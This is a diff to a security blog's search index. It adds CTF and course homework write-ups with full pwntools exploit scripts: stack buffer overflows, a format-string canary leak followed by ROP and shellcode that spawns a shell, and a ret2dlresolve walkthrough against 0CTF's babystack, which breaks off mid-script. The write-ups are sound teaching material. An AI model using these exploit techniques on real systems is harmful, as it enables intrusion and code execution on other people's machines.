@@ -21,6 +21,161 @@
             "title": "Contact"
         },
         {
+            "location": "/course/csie/",
+            "text": "CSIE\n\n\n\u9019\u662f\u4e00\u9580\u53f0\u5927\u3001\u4ea4\u5927\u3001\u53f0\u79d1\u4e09\u6821\u5408\u8fa6\u7684\u7a0b\u5f0f\u5b89\u5168\u8ab2\u7a0b\uff0c\u8ab2\u7a0b\u5167\u5bb9\u6709\u53ef\u80fd\u96a8\u8457\u8001\u5e2b\u6216\u52a9\u6559\u4e0d\u540c\u800c\u6539\u8b8a\u3002106 \u4e0b\u5b78\u671f\u7684\u8ab2\u4e3b\u8981\u90fd\u662f Pwn \u548c Reverse \u5c45\u591a XD\n\n\n\u9019\u88e1\u6703\u7d00\u9304\u4e00\u4e0b\u6bcf\u9031\u7684\u4f5c\u696d\u548c\u7df4\u7fd2\u984c\u7684\u89e3\u984c\u65b9\u6cd5\u548c\u601d\u8def\uff0c\u4e5f\u6b61\u8fce\u5927\u5bb6\u767c issue \u8a0e\u8ad6\n\n\n\u984c\u76ee binary \u548c\u89e3\u984c script \u90fd\u53ef\u4ee5\u5728 \n\u9019\u88e1\n \u627e\u5230",
+            "title": "Index"
+        },
+        {
+            "location": "/course/csie/#csie",
+            "text": "\u9019\u662f\u4e00\u9580\u53f0\u5927\u3001\u4ea4\u5927\u3001\u53f0\u79d1\u4e09\u6821\u5408\u8fa6\u7684\u7a0b\u5f0f\u5b89\u5168\u8ab2\u7a0b\uff0c\u8ab2\u7a0b\u5167\u5bb9\u6709\u53ef\u80fd\u96a8\u8457\u8001\u5e2b\u6216\u52a9\u6559\u4e0d\u540c\u800c\u6539\u8b8a\u3002106 \u4e0b\u5b78\u671f\u7684\u8ab2\u4e3b\u8981\u90fd\u662f Pwn \u548c Reverse \u5c45\u591a XD  \u9019\u88e1\u6703\u7d00\u9304\u4e00\u4e0b\u6bcf\u9031\u7684\u4f5c\u696d\u548c\u7df4\u7fd2\u984c\u7684\u89e3\u984c\u65b9\u6cd5\u548c\u601d\u8def\uff0c\u4e5f\u6b61\u8fce\u5927\u5bb6\u767c issue \u8a0e\u8ad6  \u984c\u76ee binary \u548c\u89e3\u984c script \u90fd\u53ef\u4ee5\u5728  \u9019\u88e1  \u627e\u5230",
+            "title": "CSIE"
+        },
+        {
+            "location": "/course/csie/practice/",
+            "text": "Practice",
+            "title": "Practice"
+        },
+        {
+            "location": "/course/csie/practice/#practice",
+            "text": "",
+            "title": "Practice"
+        },
+        {
+            "location": "/course/csie/hw0/",
+            "text": "Hw0\n\n\npwn1\n\n\nArch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments\n\n\n\n\nconcept\n\n\nobjdump \u5f8c\u767c\u73fe main \u88e1\u9762\u662f gets \u8b80\u53d6\u8f38\u5165\uff0c\u6c92\u6709\u6aa2\u67e5\u9577\u5ea6\u6240\u4ee5\u6709 buffer overflow \u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8df3\u5230 callme \u51fd\u6578\u5373\u53ef\u62ff\u5230 shell\n\n\n\n\n\u4f7f\u7528 gdb \u6e2c\u51fa ret addr offset \u70ba 40\n\n\n\n\nexploit\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nremote\n(\n\"csie.ctf.tw\"\n,\n \n10120\n)\n\n\n\naddr\n \n=\n \n0x0000000000400566\n\n\n\nr\n.\nsendline\n(\n'a'\n \n*\n \n40\n \n+\n \np64\n(\naddr\n))\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag\n\n\nFLAG{BuFFer_0V3Rflow_is_too_easy}\n\n\nBubbleSort\n\n\nArch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n\n\n\n\nconcept\n\n\nobjdump \u5f8c\u8b80\u61c2\u7a0b\u5f0f\u908f\u8f2f\u5f8c\u767c\u73fe BubbleSort \u4e2d\u76f4\u63a5\u5c07 al \u7576\u4f5c sort \u7684\u500b\u6578\n\n\n\n\n\u800c\u539f\u5148\u8f38\u5165 sort \u500b\u6578\u7684\u503c\u5c31\u662f\u5b58\u5728 eax \u4e2d\uff0c\u4e0d\u904e\u4ed6\u6709\u5224\u65b7 sort \u500b\u6578\u4e0d\u80fd\u8d85\u904e array \u9577\u5ea6\uff0c\u4f46\u662f\u53ef\u4ee5\u8f38\u5165\u8ca0\u6578\u4f7f\u5f97 al \u7684\u503c\u8d85\u904e array \u9577\u5ea6\uff0c\u5c0e\u81f4 sort \u8d85\u904e array \u7bc4\u570d\uff0c\u5982\u6b64\u5373\u53ef\u4fee\u6539 ret addr \u8df3\u5230 DarkSoul \u51fd\u6578\u7372\u5f97 shell\n\n\n\n\n\n\nexploit\n\n\n\u5c07 127 \u683c\u5168\u90e8\u586b\u6eff DarkSoul \u7684 addr\uff0c\u63a5\u8457\u53ea\u8981 sort \u5f8c ret addr \u70ba DarkSoul addr \u5c31\u6210\u529f\uff0c\u6e2c\u8a66\u4e00\u4e0b\u767c\u73fe -1 \u5c31\u53ef\u4ee5\u4e86\n\n\n\u4e0d\u76f4\u63a5\u7b97 ret addr offset \u7684\u539f\u56e0\u662f\u56e0\u70ba\u5176\u4e2d\u7684\u6b98\u503c\u8207 DarkSoul addr \u5927\u5c0f\u95dc\u4fc2\u4e0d\u78ba\u5b9a\uff0c\u4e0d\u4e00\u5b9a\u76f4\u63a5 sort 127 + offset \u7684\u5927\u5c0f\u5c31\u80fd\u6210\u529f\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nremote\n(\n\"csie.ctf.tw\"\n,\n \n10121\n)\n\n\n\naddr\n \n=\n \n'0x08048580'\n\n\n\nr\n.\nrecvuntil\n(\n':'\n)\n\n\nr\n.\nsendline\n(\n'127'\n)\n\n\nr\n.\nrecvuntil\n(\n':'\n)\n\n\nr\n.\nsendline\n(\n'{} '\n.\nformat\n(\nstr\n(\nint\n(\naddr\n,\n \n16\n)))\n \n*\n \n127\n)\n\n\nr\n.\nrecvuntil\n(\n':'\n)\n\n\nr\n.\nsendline\n(\n'-1'\n)\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag\n\n\nFLAG{Bubble_sort_is_too_slow_and_this_question_is_too_easy}\n\n\nret222\n\n\nArch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\nFORTIFY:  Enabled\n\n\n\n\nconcept\n\n\n\u89c0\u5bdf\u5230\u8a72\u7a0b\u5f0f\u4fdd\u8b77\u5168\u958b\uff0c\u6240\u4ee5\u5148\u627e\u4e00\u4e0b\u6709\u6c92\u6709 format string \u6216 heap \u76f8\u95dc\u7684\u6f0f\u6d1e\n\n\n\u53ef\u4ee5\u767c\u73fe\u5728 Show info \u8f38\u51fa name \u7684\u6642\u5019\u6709 format string \u7684\u6f0f\u6d1e\n\n\n\n\n\u800c\u5728 Save data \u6642\u4f7f\u7528 \ngets\n \u9020\u6210 buffer overflow\n\n\n\u6240\u4ee5\u53ef\u4ee5\u5229\u7528 format string leak \u51fa code base \u548c canary\uff0c\u7136\u5f8c\u518d\u5229\u7528 buffer overflow \u505a\u51fa ROP \u8b80\u5165 shellcode \u5230 name \u4e0a\uff0c\u6700\u5f8c\u518d\u8df3\u5230 name \u4e0a\u5373\u53ef (\u7a0b\u5f0f\u6700\u5f8c\u7d50\u675f\u6642\u6703\u5c07 name \u5f8c\u7684\u4e00\u5927\u584a memory \u6b0a\u9650\u8a2d\u6210 rwx)\n\n\nexploit\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nprocess\n(\n'./ret222'\n)\n\n\n\ncontext\n.\narch\n \n=\n \n'amd64'\n\n\n\ndef\n \nsetname\n(\ndata\n):\n\n    \nr\n.\nsendlineafter\n(\n'>'\n,\n \n'1'\n)\n\n    \nr\n.\nsendafter\n(\n':'\n,\n \ndata\n)\n\n\n\ndef\n \nshowinfo\n():\n\n    \nr\n.\nsendlineafter\n(\n'>'\n,\n \n'2'\n)\n\n    \nr\n.\nrecvuntil\n(\n':'\n)\n\n\n\ndef\n \nsavedata\n(\ndata\n):\n\n    \nr\n.\nsendlineafter\n(\n'>'\n,\n \n'3'\n)\n\n    \nr\n.\nsendlineafter\n(\n':'\n,\n \ndata\n)\n\n\n\ndef\n \nex\n():\n\n    \nr\n.\nsendlineafter\n(\n'>'\n,\n \n'4'\n)\n\n\n\nsetname\n(\n\"%23$p\"\n)\n\n\nshowinfo\n()\n\n\ncanary\n \n=\n \nint\n(\nr\n.\nrecvuntil\n(\n'*'\n)[\n2\n:\n-\n1\n],\n \n16\n)\n\n\nlog\n.\ninfo\n(\nhex\n(\ncanary\n))\n\n\n\nsetname\n(\n\"%24$p\"\n)\n\n\nshowinfo\n()\n\n\nbase\n \n=\n \nint\n(\nr\n.\nrecvuntil\n(\n'*'\n)[\n2\n:\n-\n1\n],\n \n16\n)\n \n-\n \n0xd40\n\n\nlog\n.\ninfo\n(\nhex\n(\nbase\n))\n\n\n\nname\n \n=\n \nbase\n \n+\n \n0x202020\n\n\nmain\n \n=\n \nbase\n \n+\n \n0xc00\n\n\ngets\n \n=\n \nbase\n \n+\n \n0x908\n\n\npop_rdi\n \n=\n \nbase\n \n+\n \n0xda3\n\n\n\npayload\n \n=\n \n'a'\n \n*\n \n136\n \n+\n \nflat\n(\ncanary\n,\n \n'deadbeef'\n,\n \npop_rdi\n,\n \nname\n,\n \ngets\n,\n \nmain\n)\n\n\nsavedata\n(\npayload\n)\n\n\nex\n()\n\n\n\nr\n.\nsendline\n(\nasm\n(\nshellcraft\n.\nsh\n()))\n\n\n\npayload\n \n=\n \n'a'\n \n*\n \n136\n \n+\n \nflat\n(\ncanary\n,\n \n'deadbeef'\n,\n \nname\n)\n\n\nsavedata\n(\npayload\n)\n\n\nex\n()\n\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag\n\n\nFLAG{YOU_ARE_REALLY_SMART!!!!!!}\n\n\nrev1\n\n\nconcept\n\n\nobjdump \u5f8c\u767c\u73fe\u6709\u4e00\u500b print_flag \u51fd\u6578\n\n\n\n\n\u76f4\u63a5\u4f7f\u7528 gdb \u8df3\u904e\u53bb\u5c31\u6703\u5370\u51fa flag \u4e86\n\n\n\n\nflag\n\n\nFLAG{_reverse_is_fun}\n\n\nrev2\n\n\nconcept\n\n\n\u4f7f\u7528 IDA \u53cd\u7d44\u8b6f\u5f8c\u53ef\u4ee5\u767c\u73fe\u4ed6\u5c07\u8f38\u5165\u6bcf byte \u8207 0xcc \u505a xor \u5f8c\u548c\u4e00\u500b\u7279\u5b9a\u5b57\u4e32 (unk_4120BC) \u6bd4\u8f03\uff0c\u82e5\u76f8\u540c\u8f38\u5165\u5373\u70ba flag\n\n\n\n\nunk_4120BC \u5167\u5bb9\n\n\n\n\n\u5229\u7528 xor \u7684\u7279\u6027\u53ef\u77e5\u5c07 unk_4120BC \u6bcf byte xor 0xcc \u5373\u53ef\u9084\u539f\u51fa flag\n\n\nexploit\n\n\n#!/usr/bin/python3\n\n\n\nflag\n \n=\n \n[\n0x8A\n,\n \n0x80\n,\n \n0x8D\n,\n \n0x8B\n,\n \n0xB7\n,\n \n0x94\n,\n \n0xFC\n,\n \n0xBE\n,\n \n0x93\n,\n \n0xB8\n,\n \n0xA3\n,\n\n        \n0x93\n,\n \n0x8F\n,\n \n0xBE\n,\n \n0xF8\n,\n \n0xAF\n,\n \n0xA7\n,\n \n0x93\n,\n \n0x81\n,\n \n0xFF\n,\n \n0xB1\n]\n\n\n\nfor\n \ni\n \nin\n \nflag\n:\n\n    \nprint\n(\nchr\n(\ni\n \n^\n \n0xcc\n),\n \nend\n=\n''\n)\n\n\n\n\n\nflag\n\n\nFLAG{X0r_to_Cr4ck_M3}",
+            "title": "Hw0"
+        },
+        {
+            "location": "/course/csie/hw0/#hw0",
+            "text": "",
+            "title": "Hw0"
+        },
+        {
+            "location": "/course/csie/hw0/#pwn1",
+            "text": "Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments",
+            "title": "pwn1"
+        },
+        {
+            "location": "/course/csie/hw0/#concept",
+            "text": "objdump \u5f8c\u767c\u73fe main \u88e1\u9762\u662f gets \u8b80\u53d6\u8f38\u5165\uff0c\u6c92\u6709\u6aa2\u67e5\u9577\u5ea6\u6240\u4ee5\u6709 buffer overflow \u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8df3\u5230 callme \u51fd\u6578\u5373\u53ef\u62ff\u5230 shell   \u4f7f\u7528 gdb \u6e2c\u51fa ret addr offset \u70ba 40",
+            "title": "concept"
+        },
+        {
+            "location": "/course/csie/hw0/#exploit",
+            "text": "#!/usr/bin/env python  from   pwn   import   *  r   =   remote ( \"csie.ctf.tw\" ,   10120 )  addr   =   0x0000000000400566  r . sendline ( 'a'   *   40   +   p64 ( addr ))  r . interactive ()",
+            "title": "exploit"
+        },
+        {
+            "location": "/course/csie/hw0/#flag",
+            "text": "FLAG{BuFFer_0V3Rflow_is_too_easy}",
+            "title": "flag"
+        },
+        {
+            "location": "/course/csie/hw0/#bubblesort",
+            "text": "Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)",
+            "title": "BubbleSort"
+        },
+        {
+            "location": "/course/csie/hw0/#concept_1",
+            "text": "objdump \u5f8c\u8b80\u61c2\u7a0b\u5f0f\u908f\u8f2f\u5f8c\u767c\u73fe BubbleSort \u4e2d\u76f4\u63a5\u5c07 al \u7576\u4f5c sort \u7684\u500b\u6578   \u800c\u539f\u5148\u8f38\u5165 sort \u500b\u6578\u7684\u503c\u5c31\u662f\u5b58\u5728 eax \u4e2d\uff0c\u4e0d\u904e\u4ed6\u6709\u5224\u65b7 sort \u500b\u6578\u4e0d\u80fd\u8d85\u904e array \u9577\u5ea6\uff0c\u4f46\u662f\u53ef\u4ee5\u8f38\u5165\u8ca0\u6578\u4f7f\u5f97 al \u7684\u503c\u8d85\u904e array \u9577\u5ea6\uff0c\u5c0e\u81f4 sort \u8d85\u904e array \u7bc4\u570d\uff0c\u5982\u6b64\u5373\u53ef\u4fee\u6539 ret addr \u8df3\u5230 DarkSoul \u51fd\u6578\u7372\u5f97 shell",
+            "title": "concept"
+        },
+        {
+            "location": "/course/csie/hw0/#exploit_1",
+            "text": "\u5c07 127 \u683c\u5168\u90e8\u586b\u6eff DarkSoul \u7684 addr\uff0c\u63a5\u8457\u53ea\u8981 sort \u5f8c ret addr \u70ba DarkSoul addr \u5c31\u6210\u529f\uff0c\u6e2c\u8a66\u4e00\u4e0b\u767c\u73fe -1 \u5c31\u53ef\u4ee5\u4e86  \u4e0d\u76f4\u63a5\u7b97 ret addr offset \u7684\u539f\u56e0\u662f\u56e0\u70ba\u5176\u4e2d\u7684\u6b98\u503c\u8207 DarkSoul addr \u5927\u5c0f\u95dc\u4fc2\u4e0d\u78ba\u5b9a\uff0c\u4e0d\u4e00\u5b9a\u76f4\u63a5 sort 127 + offset \u7684\u5927\u5c0f\u5c31\u80fd\u6210\u529f  #!/usr/bin/env python  from   pwn   import   *  r   =   remote ( \"csie.ctf.tw\" ,   10121 )  addr   =   '0x08048580'  r . recvuntil ( ':' )  r . sendline ( '127' )  r . recvuntil ( ':' )  r . sendline ( '{} ' . format ( str ( int ( addr ,   16 )))   *   127 )  r . recvuntil ( ':' )  r . sendline ( '-1' )  r . interactive ()",
+            "title": "exploit"
+        },
+        {
+            "location": "/course/csie/hw0/#flag_1",
+            "text": "FLAG{Bubble_sort_is_too_slow_and_this_question_is_too_easy}",
+            "title": "flag"
+        },
+        {
+            "location": "/course/csie/hw0/#ret222",
+            "text": "Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      PIE enabled\nFORTIFY:  Enabled",
+            "title": "ret222"
+        },
+        {
+            "location": "/course/csie/hw0/#concept_2",
+            "text": "\u89c0\u5bdf\u5230\u8a72\u7a0b\u5f0f\u4fdd\u8b77\u5168\u958b\uff0c\u6240\u4ee5\u5148\u627e\u4e00\u4e0b\u6709\u6c92\u6709 format string \u6216 heap \u76f8\u95dc\u7684\u6f0f\u6d1e  \u53ef\u4ee5\u767c\u73fe\u5728 Show info \u8f38\u51fa name \u7684\u6642\u5019\u6709 format string \u7684\u6f0f\u6d1e   \u800c\u5728 Save data \u6642\u4f7f\u7528  gets  \u9020\u6210 buffer overflow  \u6240\u4ee5\u53ef\u4ee5\u5229\u7528 format string leak \u51fa code base \u548c canary\uff0c\u7136\u5f8c\u518d\u5229\u7528 buffer overflow \u505a\u51fa ROP \u8b80\u5165 shellcode \u5230 name \u4e0a\uff0c\u6700\u5f8c\u518d\u8df3\u5230 name \u4e0a\u5373\u53ef (\u7a0b\u5f0f\u6700\u5f8c\u7d50\u675f\u6642\u6703\u5c07 name \u5f8c\u7684\u4e00\u5927\u584a memory \u6b0a\u9650\u8a2d\u6210 rwx)",
+            "title": "concept"
+        },
+        {
+            "location": "/course/csie/hw0/#exploit_2",
+            "text": "#!/usr/bin/env python  from   pwn   import   *  r   =   process ( './ret222' )  context . arch   =   'amd64'  def   setname ( data ): \n     r . sendlineafter ( '>' ,   '1' ) \n     r . sendafter ( ':' ,   data )  def   showinfo (): \n     r . sendlineafter ( '>' ,   '2' ) \n     r . recvuntil ( ':' )  def   savedata ( data ): \n     r . sendlineafter ( '>' ,   '3' ) \n     r . sendlineafter ( ':' ,   data )  def   ex (): \n     r . sendlineafter ( '>' ,   '4' )  setname ( \"%23$p\" )  showinfo ()  canary   =   int ( r . recvuntil ( '*' )[ 2 : - 1 ],   16 )  log . info ( hex ( canary ))  setname ( \"%24$p\" )  showinfo ()  base   =   int ( r . recvuntil ( '*' )[ 2 : - 1 ],   16 )   -   0xd40  log . info ( hex ( base ))  name   =   base   +   0x202020  main   =   base   +   0xc00  gets   =   base   +   0x908  pop_rdi   =   base   +   0xda3  payload   =   'a'   *   136   +   flat ( canary ,   'deadbeef' ,   pop_rdi ,   name ,   gets ,   main )  savedata ( payload )  ex ()  r . sendline ( asm ( shellcraft . sh ()))  payload   =   'a'   *   136   +   flat ( canary ,   'deadbeef' ,   name )  savedata ( payload )  ex ()  r . interactive ()",
+            "title": "exploit"
+        },
+        {
+            "location": "/course/csie/hw0/#flag_2",
+            "text": "FLAG{YOU_ARE_REALLY_SMART!!!!!!}",
+            "title": "flag"
+        },
+        {
+            "location": "/course/csie/hw0/#rev1",
+            "text": "",
+            "title": "rev1"
+        },
+        {
+            "location": "/course/csie/hw0/#concept_3",
+            "text": "objdump \u5f8c\u767c\u73fe\u6709\u4e00\u500b print_flag \u51fd\u6578   \u76f4\u63a5\u4f7f\u7528 gdb \u8df3\u904e\u53bb\u5c31\u6703\u5370\u51fa flag \u4e86",
+            "title": "concept"
+        },
+        {
+            "location": "/course/csie/hw0/#flag_3",
+            "text": "FLAG{_reverse_is_fun}",
+            "title": "flag"
+        },
+        {
+            "location": "/course/csie/hw0/#rev2",
+            "text": "",
+            "title": "rev2"
+        },
+        {
+            "location": "/course/csie/hw0/#concept_4",
+            "text": "\u4f7f\u7528 IDA \u53cd\u7d44\u8b6f\u5f8c\u53ef\u4ee5\u767c\u73fe\u4ed6\u5c07\u8f38\u5165\u6bcf byte \u8207 0xcc \u505a xor \u5f8c\u548c\u4e00\u500b\u7279\u5b9a\u5b57\u4e32 (unk_4120BC) \u6bd4\u8f03\uff0c\u82e5\u76f8\u540c\u8f38\u5165\u5373\u70ba flag   unk_4120BC \u5167\u5bb9   \u5229\u7528 xor \u7684\u7279\u6027\u53ef\u77e5\u5c07 unk_4120BC \u6bcf byte xor 0xcc \u5373\u53ef\u9084\u539f\u51fa flag",
+            "title": "concept"
+        },
+        {
+            "location": "/course/csie/hw0/#exploit_3",
+            "text": "#!/usr/bin/python3  flag   =   [ 0x8A ,   0x80 ,   0x8D ,   0x8B ,   0xB7 ,   0x94 ,   0xFC ,   0xBE ,   0x93 ,   0xB8 ,   0xA3 , \n         0x93 ,   0x8F ,   0xBE ,   0xF8 ,   0xAF ,   0xA7 ,   0x93 ,   0x81 ,   0xFF ,   0xB1 ]  for   i   in   flag : \n     print ( chr ( i   ^   0xcc ),   end = '' )",
+            "title": "exploit"
+        },
+        {
+            "location": "/course/csie/hw0/#flag_4",
+            "text": "FLAG{X0r_to_Cr4ck_M3}",
+            "title": "flag"
+        },
+        {
+            "location": "/course/csie/hw1/",
+            "text": "",
+            "title": "Hw1"
+        },
+        {
+            "location": "/course/csie/hw2/",
+            "text": "",
+            "title": "Hw2"
+        },
+        {
+            "location": "/course/csie/hw3/",
+            "text": "",
+            "title": "Hw3"
+        },
+        {
+            "location": "/course/csie/hw4/",
+            "text": "",
+            "title": "Hw4"
+        },
+        {
+            "location": "/course/csie/hw5/",
+            "text": "",
+            "title": "Hw5"
+        },
+        {
+            "location": "/course/csie/hw6/",
+            "text": "",
+            "title": "Hw6"
+        },
+        {
             "location": "/note/build-libc-with-debug-info/",
             "text": "Build libc with debug info\n\n\n\u672c\u6587\u4f7f\u7528\u74b0\u5883\u70ba 64 bit Ubuntu 16.04\n\n\nDownload source code\n\n\n\u7531 \nThe GNU C Library (glibc)\n \u5b98\u65b9\u7db2\u7ad9\u4e0b\u8f09 glibc source code\uff0c\u4ee5 glibc 2.23 \u70ba\u4f8b\n\n\n\u4e0b\u8f09 glibc 2.23 \u4e26\u89e3\u58d3\u7e2e\n\n\nwget https://ftp.gnu.org/gnu/libc/glibc-2.23.tar.gz\ntar zxvf glibc-2.23.tar.gz\n\n\n\n\nConfigure and build\n\n\n\u9032\u5165 glibc-2.23 \u8cc7\u6599\u593e\u4e2d\u4e26\u65b0\u589e\u4e00\u500b build \u7684\u8cc7\u6599\u593e\u4f9b\u7de8\u8b6f\u4f7f\u7528\n\n\ncd\n glibc-2.23\nmkdir build\n\n\n\n\n\u9032\u5165 build \u8cc7\u6599\u593e\u4e26\u8a2d\u5b9a\u7de8\u8b6f\u53c3\u6578\n\n\n\n\nCFLAGS\n\n\ndebug \u9078\u9805\u5168\u958b\u4e26\u76e1\u91cf\u4e0d\u8981\u505a\u512a\u5316\n\n\n\u53ef\u53c3\u8003\u4ee5\u4e0b\u7bc4\u4f8b\n\n\n\n\n\n\nprefix\n\n\n\u7de8\u8b6f\u5b8c\u6a94\u6848\u6240\u653e\u4f4d\u7f6e\n\n\n\u7bc4\u4f8b\u70ba\u653e\u7f6e\u5bb6\u76ee\u9304\u4e0b\u7684 glibc \u8cc7\u6599\u593e\u5167\n\n\n\n\n\n\n\n\ncd\n build\n\nCFLAGS\n=\n'-g3 -ggdb3 -gdwarf-4 -Og -Wno-error'\n ../configure --prefix\n=\n/home/\n`\nwhoami\n`\n/glibc\n\n\n\n\n\u7de8\u8b6f\u4e26\u5b89\u88dd\n\n\nmake -j4\nmake install -j4\n\n\n\n\nNote\n\n\n\u7de8\u8b6f 32 bit \u7248\u672c\u7684 glibc\n\n\n\n\nCC\n\n\ngcc -m32\n\n\n\n\n\n\nCFLAGS\n\n\nhost=i686-linux-gnu\n\n\nbuild=i686-linux-gnu\n\n\n\n\n\n\n\n\nCC\n=\n'gcc -m32'\n \nCFLAGS\n=\n'-g3 -ggdb3 -gdwarf-4 -Og -Wno-error --host=i686-linux-gnu --bulid=i686-linux-gnu'\n ../configure --prefix\n=\n/home/\n`\nwhoami\n`\n/glibc",
             "title": "Build libc with debug info"
@@ -83,7 +238,7 @@
         {
             "location": "/writeup/0CTF-2018-Quals:Baby-Stack/",
             "text": "0CTF 2018 Quals: Baby Stack\n\n\n\n\nChallenge link: \nbabystack\n\n\nCategory: Pwn\n\n\nWriteup: \nhttps://ss8651twtw.github.io/blog/writeup/0CTF-2018-Quals:Baby-Stack/\n\n\n\n\n\n\nInfo leak is no longer required to exploit a stack overflow in 2018.\n\n\nEnjoy the babystack\n\n\n202.120.7.202:6666\n\n\nProtection\n\n\nArch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n\n\n\n\nAnalysis\n\n\n\n\npow.py\n\n\n\n\nIt is a wrapper of babystack.\nAdd proof-of-work and limiting the length of input is \n0x100\n; also pipe stdout and stderr to \n/dev/null\n.\n\n\n\n\nbabystack\n\n\n\n\nJust alarm and read buffer.\n\n\nssize_t\n \nsub_804843B\n()\n\n\n{\n\n  \nchar\n \nbuf\n;\n \n// [esp+0h] [ebp-28h]\n\n\n  \nreturn\n \nread\n(\n0\n,\n \n&\nbuf\n,\n \n0x40u\n);\n\n\n}\n\n\n\nint\n \n__cdecl\n \nmain\n()\n\n\n{\n\n  \nalarm\n(\n0xAu\n);\n\n  \nsub_804843B\n();\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\nVulnerability\n\n\nNo canary found and we can read a lot of characters to buf.\n\n\n\n\nBuffer overflow\n in \nread(0, &buf, 0x40u)\n\n\n\n\nIdea\n\n\n\n\nno output function => cannot do information leak\n\n\nno libc provided => guessing function offset maybe hard\n\n\nNX enabled => read shell code and jump to execute cannot work\n\n\n\n\nAccording to the description, \"info leak is no longer required\", it means that we can use ret2dlresolve skill to pwn it!\n\n\nTry to solve by the following steps:\n\n\n\n\nuse rop to read fake data structures and ret2main\n\n\nuse ret2dlresolve to call \nsystem(\"/bin/sh\")\n\n\n\n\nFake data structures:\n\n\n\n\nElf32_Rel\n\n\n\n\n/* Relocation table entry without addend (in section of type SHT_REL).  */\ntypedef struct\n{\n  Elf32_Addr        r_offset;                /* Address */\n  Elf32_Word        r_info;                        /* Relocation type and symbol index */\n} Elf32_Rel;\n\n\n\n\nhttps://code.woboq.org/userspace/glibc/elf/elf.h.html#633\n\n\n\n\nElf32_Sym\n\n\n\n\n/* Symbol table entry.  */\ntypedef struct\n{\n  Elf32_Word        st_name;                /* Symbol name (string tbl index) */\n  Elf32_Addr        st_value;                /* Symbol value */\n  Elf32_Word        st_size;                /* Symbol size */\n  unsigned char        st_info;                /* Symbol type and binding */\n  unsigned char        st_other;                /* Symbol visibility */\n  Elf32_Section        st_shndx;                /* Section index */\n} Elf32_Sym;\n\n\n\n\nhttps://code.woboq.org/userspace/glibc/elf/elf.h.html#518\n\n\nWorking flow about \n_dl_runtime_resolve\n\n\n     _dl_runtime_resolve(link_map, reloc_arg)\n                                       +\n          +-----------+                |\n          | Elf32_Rel | <--------------+\n          +-----------+\n     +--+ | r_offset  |        +-----------+\n     |    |  r_info   | +----> | Elf32_Sym |\n     |    +-----------+        +-----------+      +----------+\n     |      .rel.plt           |  st_name  | +--> | system\\0 |\n     |                         |           |      +----------+\n     v                         +-----------+        .dynstr\n+----+-----+                      .dynsym\n| <system> |\n+----------+\n  .got.plt\n\n\n\n\n\n\n\n\nfake \nElf32_Rel\n\n\n\n\nr_offset\n writable (after resolving symbol write the actual address of function)\n\n\nr_info\n high 24 bits\n\n\n(r_info >> 8) * 16\n point to fake \nElf32_Sym\n (16 is size of \nElf32_Sym\n)\n\n\n\n\n\n\nr_info\n low 8 bits\n\n\nmust be \n0x07\n (R_386_JMP_SLOT)\n\n\n\n\n\n\n\n\n\n\n\n\nfake \nElf32_Sym\n\n\n\n\n.dynstr + st_name\n point to \nsystem\n string\n\n\n\n\n\n\n\n\nRead the fake \nElf32_Rel\n\u3001\nElf32_Sym\n structures and ret2main to call \n_dl_runtime_resolve\n.\n\n\n\n\nuse \nplt0\n\n\n\n\nDisassembly of section .plt:\n\n080482f0 <read@plt-0x10>:                                             // plt0\n 80482f0:       ff 35 04 a0 04 08       push   DWORD PTR ds:0x804a004 // push link_map\n 80482f6:       ff 25 08 a0 04 08       jmp    DWORD PTR ds:0x804a008 // jmp _dl_runtime_resolve\n\n\n\n\nWe can calculate the \nreloc_arg\n to make \n.rel.plt + reloc_arg\n point to our fake structures and jump to \nplt0\n, let it resolve symbol to \nsystem\n.\n\n\nAfter resolving the symbol, \n_dl_runtime_resolve\n will call the function.\n\n\nExploitation\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nhashlib\n \nimport\n \nsha256\n\n\nimport\n \ntime\n\n\n\n# r = process('./babystack')\n\n\nr\n \n=\n \nremote\n(\n'202.120.7.202'\n,\n \n6666\n)\n\n\n\ndef\n \nverify\n():\n\n    \ndata\n \n=\n \nr\n.\nrecvline\n()[:\n-\n1\n]\n\n    \nfor\n \ni\n \nin\n \nxrange\n(\n2\n \n**\n \n32\n):\n\n        \nif\n \nsha256\n(\ndata\n \n+\n \np32\n(\ni\n))\n.\ndigest\n()\n.\nstartswith\n(\n'\n\\0\\0\\0\n'\n):\n\n            \nbreak\n\n    \nr\n.\nsend\n(\np32\n(\ni\n))\n\n    \nlog\n.\ninfo\n(\n'POW is over'\n)\n\n    \nsleep\n(\n0.5\n)\n\n\n\ndef\n \nsend\n(\ndata\n,\n \nlength\n):\n\n    \ntime\n.\nsleep\n(\n0.1\n)\n\n    \nr\n.\nsend\n(\ndata\n.\nljust\n(\nlength\n))\n\n\n\nplt0\n \n=\n \n0x80482f0\n\n\nrelplt\n \n=\n \n0x80482b0\n\n\ndynsym\n \n=\n \n0x80481cc\n\n\ndynstr\n \n=\n \n0x804822c\n\n\n\nmain\n \n=\n \n0x8048457\n\n\nread_plt\n 